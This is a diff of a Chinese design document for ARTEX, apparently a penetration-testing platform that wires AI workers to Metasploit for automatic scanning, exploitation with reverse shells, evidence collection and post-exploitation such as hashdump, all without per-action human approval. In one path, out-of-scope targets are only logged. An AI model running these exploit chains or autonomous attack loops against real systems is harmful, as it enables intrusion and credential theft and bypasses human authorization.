@@ -1,23 +1,27 @@
-# Metasploit 全自动闭环（msf）
+# Metasploit 全自动闭环（msf + autopwn）
 
-本页说明 ARTEX 如何把 **mcp-pymetasploit3**（Metasploit RPC 的 MCP 封装）接入 Worker，
-并用一个**确定性决策层**把「漏洞 → 模块 → 参数 → 执行 → 会话」串成可复现的闭环。
+本页说明 ARTEX 如何把 Metasploit 接进 Worker，并把「资产 → 漏洞 → 模块 → 参数 → 执行 → 会话 → 取证」
+串成可复现的闭环。
+
+**没有 MCP，也没有 Python。** ARTEX 用自带的 `msfrpc` 包直接跟 `msfrpcd` 说 Metasploit 自己的
+MessagePack-RPC（`POST /api/`，`Content-Type: binary/message-pack`）。`pymetasploit3` /
+`mcp-pymetasploit3` / `fastmcp` / 系统解释器都与本闭环无关——二进制自包含，离线可用。
 
 ```
-┌──────────── ARTEX Worker ────────────┐
-│ 1. msf_plan    （纯决策，无网络）      │  漏洞类别/目标 → 候选模块 + 参数 + 前置条件 + 失败分支
-│ 2. msf_execute （自动执行候选链）      │  连 MCP → use_module → set_option → execute → list_sessions
-│ 3. 写回 fact / 登记 ARTEX 会话        │  session id、主机、权限、可达网段
-└───────────────┬──────────────────────┘
-                │ stdio MCP (JSON-RPC)
-        ┌───────▼────────┐      msfrpc       ┌──────────────┐
-        │ mcp-pymetasploit3 │ ───────────────▶ │ msfrpcd (55553) │
-        └────────────────┘                  └──────┬───────┘
-                                                   │
-                                            Metasploit Framework
+┌──────────────── ARTEX Worker / autopwn ────────────────┐
+│ 1. msf_plan / autopwn 扫描   决策与侦察（纯 Go、无网络依赖）│
+│ 2. msf_execute / autopwn_run 执行候选链                   │
+│ 3. 会话 → 自动取证 → 写回 fact                            │
+└───────────────┬────────────────────────────────────────┘
+                │ msfrpc（MessagePack over HTTP）
+        ┌───────▼────────┐
+        │ msfrpcd (55553)│  ← ARTEX 可自动拉起（随机密码、仅 loopback）
+        └───────┬────────┘
+                │
+        Metasploit Framework
 ```
 
-## 1. 安装与接入（零人工，默认全自动）
+## 1. 接入与启动（零人工）
 
 ### 1.1 Metasploit RPC：ARTEX 自己拉起
 
@@ -33,105 +37,50 @@
 可用环境变量微调：`ARTEX_MSF_AUTOSTART=0` 关闭自动启动、`ARTEX_MSF_RPC_PORT` 改端口、
 `ARTEX_MSF_RPC_ADDR` 改地址、`ARTEX_MSF_RPC_PASSWORD` 指定密码。
 
-### 1.2 MCP 服务：不需要在 UI 里配置，也不需要手工装包
+### 1.2 协议实现：`msfrpc/`
 
-首次启动时如果检测不到 `mcp-pymetasploit3`，ARTEX 会在后台自动执行：
+| 文件 | 内容 |
+|---|---|
+| `msfrpc/msgpack.go` | MessagePack 编解码（无第三方依赖；含 msfrpcd 真实报文回归用例） |
+| `msfrpc/client.go` | `POST /api/` 客户端：`auth.login`、`core.version`、`module.info/execute`、`console.*`、`session.*` |
+| `msfrpc/console.go` | `RunConsole`：建 console → 写脚本 → 轮询读回，是"跑带任意参数的模块"的唯一可靠方式 |
 
-```bash
-pip install "mcp-pymetasploit3[mcp]"
-```
+要点：
 
-- 最长 5 分钟，失败只记日志，不影响 ARTEX 启动；
-- `ARTEX_MSF_AUTO_INSTALL=0` 关闭自动安装；
-- `ARTEX_MSF_PYTHON=/path/to/python` 指定解释器或 venv（指定后只认该解释器，忽略 PATH 上的 console 脚本）。
-
-> 手动安装等价于 `pip install "mcp-pymetasploit3[mcp]"`；`[mcp]` extra 会带上 `fastmcp`，
-> 缺它时 `import mcp_pymetasploit3` 会失败。
-
-ARTEX 启动时会种入一条 disabled 的 `metasploit` MCP 配置；但 `msf_execute` **不依赖它**：
-找不到启用的 MCP 行时，会直接用内置启动器拉起 `mcp-pymetasploit3`（console 脚本优先，
-否则 `python -m mcp_pymetasploit3`）。所以无需「系统 → MCP」启用、也无需给 worker
-授权 MCP 工具可见性——闭环工具是 ARTEX 的 host 工具（`msf_plan`/`msf_next`/`msf_execute`），
-内部直接调用 MCP。
-
-> 如果确实想用「系统 → MCP」统一管理/看工具，也可以在那里启用内置 `metasploit`；
-> 两种方式等价，内置启动器只是兜底。
+- msfrpcd 的返回里 **键和值都是 bin（0xc4）而不是 str**（Ruby 的 msgpack 习惯），解码器把
+  `[]byte` 键归一成字符串；否则 `result`/`token` 全部取不到。
+- TLS 是自签名证书，`InsecureSkipVerify` + `ARTEX_MSF_RPC_SSL=true|false|auto` 控制；
+  ARTEX 自己拉起的实例用 `-S`（明文、仅 loopback），`auto` 会两种都试。
+- 认证用 `auth.login` 返回的一次性 token，不额外生成永久 token。
 
 ### 1.3 RPC 密码
 
-`msf_execute` 按以下顺序取密码：
+`msf_execute` / `autopwn_run` 按以下顺序取密码：
 
 1. 入参 `rpc_password`
 2. 环境变量 `ARTEX_MSF_RPC_PASSWORD`
 3. 设置项 `msf_rpc_password`（自动启动时生成并写入）
 4. 受管进程内存中的密码
 
-密码不会写进日志；MCP 的 `connect` 调用只在首次连接时发生。
-
-### 1.4 全自动触发（AI 自己开始）
-
-不需要人去点「确认漏洞」再手动派单：
-
-- 验证器（`record_finding_check_result` → `verified`）把漏洞置为 confirmed 时，
-  服务端回调 `OnFindingConfirmed` → `msfAutoKick`。
-- 人工在 UI 把漏洞状态改为 confirmed 也会触发同一逻辑。
-- `msfAutoKick` 直接向 frontier 下发一条高优先级意图（origin=`msf`，锚定漏洞节点与资产，
-  summary 自带类别、目标与执行纪律），worker 池会直接领取，不再依赖下一轮 planner 派单；
-  同时写一条 hint 告知 planner「已派发、勿重复」。同一漏洞已有 open/running 的利用意图
-  时跳过；写意图失败则退回 hint 路径，不会静默丢掉闭环。
-- worker 调 `msf_plan` → `msf_execute`；`msf_execute` 拿到 session 后自动采集证据并写回 fact。
-
-也就是说：**人只需要给目标与授权范围，剩下由 planner/worker 的 AI 闭环完成**。
-`msf_execute` 仍是 host 工具（不是 MCP 工具透传），所有结果都进 transcript/fact，可审计。
+密码不会写进日志。
 
 ## 2. 决策层（`msf/`）
 
-决策是**纯函数**：同一输入永远得到同一 `plan_id`、同一候选顺序、同一分支，不依赖模型采样，
-因此 planner/worker 重启后可以重算同一计划。
-
-### 2.1 输入
+决策是**纯函数**：同一输入永远得到同一 `plan_id`、同一候选顺序、同一分支。
 
 `vuln_class`（类别/产品/CVE 自由文本，内部归一化）、`host`、`port`、`service`、`url`、
-`lhost`/`lport`。类别归一化覆盖：struts2、log4j、weblogic、tomcat、spring、jenkins、shiro、
-activemq、solr、confluence、eternalblue(MS17-010)、bluekeep(CVE-2019-0708)、vsftpd、redis、
-ssh/mysql/mssql/smb 口令类。
+`lhost`/`lport`。覆盖：struts2、log4j、weblogic、tomcat、spring、jenkins、shiro、activemq、
+solr、confluence、eternalblue(MS17-010)、bluekeep(CVE-2019-0708)、vsftpd、redis、ssh/mysql/mssql/smb
+口令类。未命中内置类目时返回 `kind=search` + `suggested_search`，要求先检索，**不猜模块名**。
 
-未命中内置类目时返回 `kind=search` + `suggested_search`，要求先用 `search_modules` 检索，
-**不猜模块名**。
-
-### 2.2 输出（节选）
-
-```json
-{
-  "plan_id": "msf-1a2b3c4d5e6f",
-  "kind": "exploit",
-  "class": "struts2",
-  "candidates": [
-    {"order":1,"module_type":"exploit","module":"exploit/multi/http/struts2_content_type_ognl",
-     "payload":"linux/x64/meterpreter/reverse_tcp",
-     "options":{"RHOSTS":"10.0.0.5","RPORT":"8080","TARGETURI":"/app/login.action","LHOST":"10.0.0.1","PAYLOAD":"..."},
-     "confidence":80,"rationale":"Content-Type OGNL 注入，覆盖 S2-045/S2-046 系"}
-  ],
-  "preconditions":["port_open:10.0.0.5:8080","module_exists: ...","callback_reachable:10.0.0.1:4444"],
-  "branches":[
-    {"on":"module_missing","do":"retry_next"},
-    {"on":"precheck_failed","do":"degrade"},
-    {"on":"no_session","do":"retry_next"},
-    {"on":"session","do":"post_session"},
-    {"on":"exhausted","do":"stop"}
-  ],
-  "session_post":["sysinfo / whoami","getuid","ipconfig / ifconfig","写回 fact"]
-}
-```
-
-### 2.3 失败分支（`msf_next`，确定性）
+失败分支（`msf_next`，确定性）：
 
 | 观察结果 | 动作 | 语义 |
 |---|---|---|
-| `session` | `session` | 拿到会话 → `msf_execute` 已自动取证并写回 fact |
+| `session` | `session` | 拿到会话 → 已自动取证并写回 fact |
 | `module_missing` | `retry` | 当前 MSF 没有该模块 → 下一候选 |
 | `precheck_failed` | `degrade` | 前置条件不满足 → 转 check/辅助验证，写否定 fact |
-| `no_session` | `retry` | 模块跑完无会话 → 下一候选（换利用面/payload） |
+| `no_session` | `retry` | 模块跑完无会话 → 下一候选 |
 | `error` | `retry` | RPC/模块报错 → 下一候选 |
 | 候选耗尽 | `stop` | 写否定 fact（模块+参数+原因），禁止重复同一路径 |
 
@@ -140,43 +89,160 @@ ssh/mysql/mssql/smb 口令类。
 | 工具 | 读 | 作用 |
 |---|---|---|
 | `msf_plan` | ✅ | 只读决策：候选模块、参数、前置条件、分支、取证步骤 |
-| `msf_next` | ✅ | 无状态分支选择：传同一目标 + `attempt` + `outcome`，返回下一步动作 |
-| `msf_execute` | ❌ | 全自动执行候选链：连 MCP → use_module → 设参 → execute → 轮询会话；返回 transcript 与 session id |
+| `msf_next` | ✅ | 无状态分支选择：同一目标 + `attempt` + `outcome` → 下一步动作 |
+| `msf_execute` | ❌ | 已知漏洞的候选链执行：modules → console → 轮询会话 → 取证 → fact |
+| `autopwn_run` | ❌ | **全自动闭环**：扫描 → 识别 → 匹配 → 利用 → 取证 → 后渗透，一次调用跑完一批目标 |
 
-`msf_execute` 的硬边界：
+硬边界：
 
-- **scope 门**：目标必须落在任务已登记的 `task_scope` 内；任务没有任何 scope 时放行并记审计
-  （bootstrap 阶段），越界直接拒绝。
-- 只应在**漏洞已确认**之后调用；它不负责发现漏洞。
+- **scope 门**：`msf_execute` 越界只记日志（沿用历史行为）；`autopwn_run` 对**越界目标直接拒绝**——
+  它会在一批目标上连续动作，不能"先跑再看"。
+- `msf_execute` / `autopwn_run` 只在**漏洞已确认**或**已授权侦察**之后调用。
 - 每轮默认最多试 3 个候选（上限 8），等待会话默认 25s（上限 120s）。
-- 执行结果（含失败）应写回 fact，形成「尝试过什么」的可审计链路，避免 planner 重复派单。
+- 执行结果（含失败）都要写回 fact，形成可审计链路。
 
-## 4. Worker 闭环用法（AI 自动执行，无人工步骤）
+## 4. 全自动闭环 `autopwn`（0.3.28）
 
-触发由系统完成（验证器/UI 确认漏洞 → `msfAutoKick` → 直接下发 worker 意图，详见 §1.4）。
-Worker 拿到意图后：
+### 4.1 七个阶段
 
-1. `msf_plan` 拿计划（或 planner 已给出 `vuln_class`）。
-2. `msf_execute` 自动跑；返回 `sessions` 非空即成功。
-3. **拿到会话时 `msf_execute` 已自动取证**：对每个新会话执行
-   `id/whoami/hostname/uname/ip` 只读命令，并把输出随结果的 `transcript[].evidence` 返回。
-4. **自动写回 fact**：会话 id、类别、目标、取证输出写入探索图
-   （`confidence=confirmed`，带 `msf_session_id`/`msf_plan_id`），并唤醒 planner，
-   即使模型没有补发一轮也不会丢证据。
-5. 若拿到的是可交互 shell，登记 ARTEX 会话（`register_session`）或按 MSF 会话继续操作。
-6. 失败则按 `action.kind`（retry/degrade/stop）处理，**不要**原样重试同一候选。
+1. **端口扫描**：并发 TCP connect（默认 23 个常见端口，可 `-ports 1-1024,8080`）。
+2. **服务识别**：读 banner（FTP/SSH/SMTP/MySQL 主动问候）、Web 端口发 `HEAD`、Redis 发 `PING`、
+   HTTPS 走 TLS；banner → 产品/版本归一（`vsftpd 2.3.4`、`tomcat`、`struts2`、`jenkins`…）。
+3. **规则匹配**：`autopwn/rules`（`Rules` 表）把「端口 + 产品」映射到决策层 class，再交给 `msf.Build`
+   产出候选模块、参数、置信度；同一扫描结果永远得到同一顺序。**扫描端口会被强制写回 `RPORT`**
+   （非标准端口不会被模块按默认 21/80 打偏）。
+4. **模块执行**：先 `module.info` 校验模块存在（缺失 → `module_missing`，换下一候选），
+   再在 console 里 `use` → `set` → `run -j`。
+5. **会话判定**：轮询 `session.list` 取差集；拿到会话即停。
+6. **自动取证**：对新会话执行 `whoami` / `hostname`（shell 补 CRLF、meterpreter 走 write/read），
+   证据原文进结果与 fact。
+7. **后渗透**：`post/multi/gather/env`、`post/multi/recon/local_exploit_suggester`；
+   meterpreter 会话追加 `post/windows/gather/hashdump`。模块缺失/报错只记录，不重试。
 
-## 5. 限制与注意事项
+### 4.2 两种用法
 
-- **MCP 的模块工具是无状态的**：`set_module_option` 每次都会重新 `modules.use(...)`，跨调用设置的
-  `TARGETURI`/`SSL` 等不会保留。因此 `msf_execute` 走 **console 路径**（同一 console 内
-  `use` → `set ...` → `run -j`），只有 console 不可用时才退回 `execute_module`（只支持
-  rhosts/rport/lhost/lport/payload，其余参数会丢失）。
-- **RPC SSL**：默认 `msfrpcd` 开 TLS，`msfrpcd -S` 是明文。`msf_execute` 默认 `rpc_ssl=auto`
-  （先 TLS 再明文），也可用 `rpc_ssl` 入参或 `ARTEX_MSF_RPC_SSL=true|false` 固定。
-- 模块路径随 MSF 版本变动；执行前会 `get_module_info` 校验，缺失自动走 `module_missing`。
-- 反弹 payload 需要目标能回连 `LHOST`；内网场景先建隧道再给 `LHOST` 为平台可达地址。
-- 高交互/加固目标可能「check 通但拿不到会话」，此时按 `degrade` 写否定结论，不无限重试。
-- 该闭环默认不走 ARTEX 的 `reverse_listen`/penelope；MSF 会话由 Metasploit 托管，
-  需要转入内网作业时用 `session_run_command` 或把凭据/拓扑写回资产图。
-- 合规：仅对授权目标使用；`msf_execute` 受任务 scope 硬校验，但使用者仍需自行确认授权。
+**命令行（一键）**：
+
+```bash
+# 自动拉起 msfrpcd（端口不通时）→ 登录 → 扫描 → 利用 → 取证 → 后渗透
+artex autopwn -targets 10.0.0.5,10.0.0.6 -ports 21,22,80,445 -lhost 10.0.0.1
+
+# 只侦察与规划，不碰模块
+artex autopwn -targets 10.0.0.5 -dry-run -json out.json
+
+# 复用外部 msfrpcd
+artex autopwn -targets 10.0.0.5 -msf-host 127.0.0.1 -msf-port 55553 -msf-pass *** -msf-ssl=false
+```
+
+退出码：`0` 有会话（或 `-dry-run`）、`1` 跑完但没拿到会话、`2` 连接/认证/参数失败。
+`-json` 给出逐目标 `ports / candidates / attempts / sessions / post` 全量结果，可直接进报告。
+
+**Worker 工具**：
+
+```json
+{"targets": ["10.0.0.5"], "ports": "1-1024,8080", "lhost": "10.0.0.1",
+ "max_exploits": 3, "post": true, "dry_run": false}
+```
+
+拿到会话后会自动写一条 `confidence=confirmed` 的 fact（含 session id、目标、证据），
+即使模型没有补发一轮也不会丢证据。
+
+### 4.3 自动派单
+
+- 验证器（`record_finding_check_result` → `verified`）把漏洞置为 confirmed 时，服务端回调
+  `OnFindingConfirmed` → `msfAutoKick`；人工在 UI 改 confirmed 也走同一条路。
+- `msfAutoKick` 直接向 frontier 下发高优先级意图（origin=`msf`），worker 池直接领取；
+  同一漏洞已有 open/running 意图时跳过；写意图失败退回 hint，不会静默丢闭环。
+- worker 调 `msf_plan` → `msf_execute`；没有确定性模块的类别转 `exploit_author` 写真实 exp。
+
+## 4.4 单文件发行：内置便携 Ruby + Metasploit（0.3.29）
+
+前面几节假定机器上已经装了 Metasploit。要让**一台干净机器**只靠一个 `artex.exe` 就能跑闭环，
+就需要把运行时一起带上——ARTEX 的做法是把「便携 Ruby + Metasploit framework + 预装 gems」
+压成 `runtime.zip`，作为 **trailer** 追加到 exe 尾部（不占编译期内存），运行时自解压：
+
+```text
+artex-full.exe
+├── Go 主程序
+└── [trailer] runtime.zip   ← embedded\bin\ruby.exe + embedded\framework\* + LICENSES\
+
+首次使用：
+  %LOCALAPPDATA%\ARTEX\runtime\<payload-hash>\
+     ├── embedded\bin\ruby.exe
+     ├── embedded\framework\msfrpcd + lib + modules + data
+     ├── LICENSES\
+     └── msfrpcd.log
+```
+
+要点：
+
+- **内容寻址**：目录名是 payload 的 SHA-256 前 8 字节；换了运行时就是新目录，同一份运行时
+  重复运行只认 `.ready` 版本戳，不会重复解压。
+- **防 zip-slip**：解压前校验每个条目都在目标目录内；先解到 `<hash>.tmp-<pid>` 再 `rename`，
+  解到一半失败不会留下半个运行时。
+- **Windows 长路径**：解压时自动加 `\\?\` 前缀（Metasploit 的 modules 路径很容易超过 260）。
+- **不走 cmd.exe**：`ruby.exe msfrpcd ... -U -P -p -S -n -f -a` 直接 exec，密码里的
+  `!`/`&`/`^` 不会被命令行层吃掉；`-f` 保证我们启动的进程就是我们能停掉的进程。
+- **后端选择**：`ARTEX_MSF_BACKEND=auto|external|embedded`（默认 auto：复用已监听 → 本地安装 →
+  内置自解压）。ARTEX 服务端在找不到本地 Metasploit 时也会自动走内置运行时。
+- **额外开关**：`ARTEX_MSF_RUNTIME_DIR` 改解压根目录、`ARTEX_MSF_RUNTIME_ZIP` 直接用本地
+  zip（开发调试用，免重新出包）。
+
+构建（两条命令）：
+
+```powershell
+pwsh -File scripts\build-runtime.ps1        # 从本机 C:\metasploit-framework 组装 msfrt\runtime.zip
+pwsh -File scripts\append-payload.ps1       # 追加到 artex.exe 尾部 → artex-full.exe
+# 或一条龙：
+pwsh -File scripts\build-singlefile.ps1
+```
+
+实测（本机 Metasploit 6.4.107-dev，Windows 11）：`embedded` 约 700 MB → `runtime.zip` 约 250 MB，
+单文件 `artex-full.exe` ≈ 300 MB；首次运行解压 40–90 s + `msfrpcd` 冷启动 20–60 s，
+之后每次启动只做一次目录检查。
+
+> 体积提示：运行时是 Metasploit 本体（便携 Ruby + 全量 modules/payloads），压不到几十 MB。
+> 只要协议层最小化、不带框架时，用 0.3.27 起的纯 `msfrpc` 模式即可（需要机器上已有 Metasploit）。
+
+## 5. 验证方法
+
+```bash
+go test ./msfrpc ./autopwn -count=1          # 编解码、RPC 客户端、扫描/匹配/引擎
+go test ./server -run 'TestScope|TestDiff' -count=1
+```
+
+已实测（本机 Metasploit 6.4.107-dev，Windows）：
+
+```
+$ artex autopwn -targets 127.0.0.1 -ports 2121 -dry-run
+[+] [127.0.0.1] 开放：2121/ftp(vsftpd 2.3.4)
+[+] [127.0.0.1] 候选 1 个（按置信度）：exploit/unix/ftp/vsftpd_234_backdoor
+
+$ artex autopwn -targets 127.0.0.1 -ports 2121      # 对假 FTP banner 实测
+[*] 尝试 exploit/unix/ftp/vsftpd_234_backdoor（vsftpd-2.3.4-backdoor，端口 2121）
+RHOSTS => 127.0.0.1   RPORT => 2121   PAYLOAD => cmd/unix/interact
+[*] Exploit running as background job 1.
+[*] Exploit completed, but no session was created.
+```
+
+（假服务不可利用，属预期"无会话"分支；`session → 取证 → 后渗透` 分支由
+`autopwn/engine_test.go` 的 fake MSF 用例覆盖。）
+
+## 6. 限制与注意事项
+
+- **模块路径随 MSF 版本变动**；执行前 `module.info` 校验，缺失走 `module_missing`。
+- **反弹 payload 需要目标能回连 `LHOST`**；内网场景先建隧道再给平台可达地址。
+- **Web 载体类模块**不写死 Linux meterpreter payload，交给 MSF 按 target 自选。
+- **高交互/加固目标**可能「check 通但拿不到会话」，按 `degrade` 写否定结论，不无限重试。
+- **凭据类路径**（ssh/mysql 弱口令、smb 登录）需要字典或已知凭据，autopwn 不盲目爆破；
+  交给 `msf_plan` + 显式参数。
+- **console 是唯一可靠通道**：`module.execute` 只接受 RHOSTS/RPORT/PAYLOAD/LHOST/LPORT，
+  `TARGETURI`/`SSL` 等会丢；只有 console 不可用时才退回 `module.execute`。
+- **`msfrpcd` 的密码不要带 cmd 元字符**（`!`/`&`/`|`/`^`）。通过 `.bat` 拉起时会被 cmd 解释，
+  导致「密码明明对却 Login Failed」。ARTEX 自动生成的密码是纯 hex，安全。
+- **自动拉起 msfrpcd 受宿主环境影响**：实测把 `artex.exe` 放在 `C:\Users\...\Downloads\` 下时，
+  Windows Defender/ASR 会拦截它创建 `ruby.exe` 子进程——表现是 `msfrpcd 启动后立即退出（exit=1）`
+  且日志为空；同一份二进制复制到 `%TEMP%` 或 `C:\artex` 后 20s 内正常就绪。遇到该报错先换目录，
+  或先手工起 `msfrpcd` 再用 `-msf-pass` 复用。
+- 该闭环默认不走 ARTEX 的 `reverse_listen`/penelope；MSF 会话由 Metasploit 托管。
+- 合规：仅对授权目标使用；`autopwn_run` 受任务 scope 硬校验。
